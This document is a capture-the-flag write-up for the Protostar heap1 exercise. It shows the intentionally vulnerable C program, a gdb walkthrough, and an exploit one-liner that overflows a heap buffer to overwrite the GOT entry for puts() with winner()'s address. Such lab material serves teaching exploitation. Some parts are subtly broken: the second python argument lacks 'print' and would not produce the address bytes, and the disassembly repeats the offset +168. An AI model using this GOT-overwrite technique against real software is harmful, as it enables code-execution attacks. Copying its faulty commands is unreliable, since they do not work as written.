#### Protostar Heap1

##### About
This level takes a look at code flow hijacking in data overwrite cases.  
  
This level is at /opt/protostar/bin/heap1

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

We can change the value of i2->name by overflowing i1->name in the first strcpy(), then in the second strcpy() we can write anything to anywhere.  
  
In this challenge, we can try to write the entry address of winner() to where GOT saves the entry address of puts().

##### Solution
```
$ gdb heap1
......
(gdb )disas main
Dump of assembler code for function main:
0x080484b9 <+0>:    push   %ebp
0x080484ba <+1>:    mov    %esp,%ebp
0x080484bc <+3>:    and    $0xfffffff0,%esp
0x080484bf <+6>:    sub    $0x20,%esp
0x080484c2 <+9>:    mov    $0x8,(%esp)
0x080484c9 <+16>:   call   0x80483bc <malloc@plt>    ; i1 = malloc(8)
0x080484ce <+21>:   mov    %eax,0x14(%esp)
0x080484d2 <+25>:   mov    0x14(%esp),%eax
0x080484d6 <+29>:   mov    $0x1,(%eax)               ; priority = 1
0x080484dc <+35>:   mov    $0x8,(%esp)
0x080484e3 <+42>:   call   0x80483bc <malloc@plt>    ; name = malloc(8)
0x080484e8 <+47>:   mov    %eax,%edx
0x080484ea <+49>:   mov    0x14(%esp),%eax
0x080484ee <+53>:   mov    %edx,0x4(%eax)            ; i1->name = name
0x080484f1 <+56>:   mov    $0x8,(%esp)
0x080484f8 <+63>:   call   0x80483bc <malloc@plt>    ; i2 = malloc(8)
0x080484fd <+68>:   mov    %eax,0x18(%esp)
0x08048501 <+72>:   mov    0x18(%esp),%eax
0x08048505 <+76>:   mov    $0x2,(%eax)               ; priority = 2
0x0804850b <+82>:   mov    $0x8,(%esp)
0x08048512 <+89>:   call   0x80483bc <malloc@plt>    ; name = malloc(8)
0x08048517 <+94>:   mov    %eax,%edx
0x08048519 <+96>:   mov    0x18(%esp),%eax
0x0804851d <+100>:  mov    %edx,0x4(%eax)            ; i2->name = name
0x08048520 <+103>:  mov    0xc(%ebp),%eax
0x08048523 <+106>:  add    $0x4,%eax
0x08048526 <+109>:  mov    (%eax),%eax
0x08048528 <+111>:  mov    %eax,%edx
0x0804852a <+113>:  mov    0x14(%esp),%eax
0x0804852e <+117>:  mov    0x4(%eax),%eax            ; i1->name
0x08048531 <+120>:  mov    %edx,0x4(%esp)
0x08048535 <+124>:  mov    %eax,(%esp)
0x08048538 <+127>:  call   0x804838c <strcpy@plt>    ; strcpy(i1->name, argv[1])
0x0804853d <+132>:  mov    0xc(%ebp),%eax
0x08048540 <+135>:  add    $0x8,%eax
0x08048543 <+138>:  mov    (%eax),%eax
0x08048545 <+140>:  mov    %eax,%edx
0x08048547 <+142>:  mov    0x18(%esp),%eax
0x0804854b <+146>:  mov    0x4(%eax),%eax
0x0804854e <+149>:  mov    %edx,0x4(%esp)            ; i2->name
0x08048552 <+153>:  mov    %eax,(%esp)
0x08048555 <+156>:  call   0x804838c <strcpy@plt>    ; strcpy(i2->name, argv[2])
0x0804855a <+161>:  mov    $0x804864b,(%esp)
0x08048561 <+168>:  call   0x80483cc <puts@plt>      ; puts()
0x08048566 <+168>:  leave
0x08048567 <+168>:  ret
End of assembler dump.
......
(gdb) b *0x0804855a
Breakpoint 1 at 0x0804855a: file heap1/heap1.c, line 34.
(gdb) r AAAAAAAA BBBBBBBB
Starting program: /opt/protostar/bin/heap1 AAAAAAAA BBBBBBBB
Breakpoint 1, main (argc=3, argv=0xbffffdb4) at heap1/heap1.c:34
......
(gdb) x $esp+0x14           ; i1
0xbffffcf4:     0x0804a008
(gdb) x/2x 0x0804a008
0x804a008:      0x00000001      0x0804a018
(gdb) x/2x 0x0804a018       ; i1->name
0x804a018:      0x41414141      0x41414141
......
(gdb) x/x $esp+0x18         ; i2
0xbffffcf8:     0x0804a028
(gdb) x/2x 0x0804a028
0x804a028:      0x00000002      0x0804a038
(gdb) x/2x 0x0804a038       ; i2->name
0x804a038:      0x42424242      0x42424242
......
(gdb) p (0x0804a028 + 4) - 0x0804a018
$1 = 20
......
(gdb) x 0x080483cc
0x80483cc <puts@plt>:   jmp    *0x8049774
(gdb) x/x 0x08049774
0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:   0x080483d2
......
(gdb) p winner
$2 = {void (void)} 0x8048494 <winner>
(gdb) quit

$ ./heap1 `python -c 'print "A"*20+"\x74\x97\x04\x08"'` `python -c '\x94\x84\x04\x08'`
and we have a winner @ 1417443167
```

##### Reference
<https://thesprawl.org/research/exploit-exercises-protostar-heap/#heap-1>  
<https://www.mattandreko.com/2012/01/12/exploit-exercises-protostar-heap-1/>
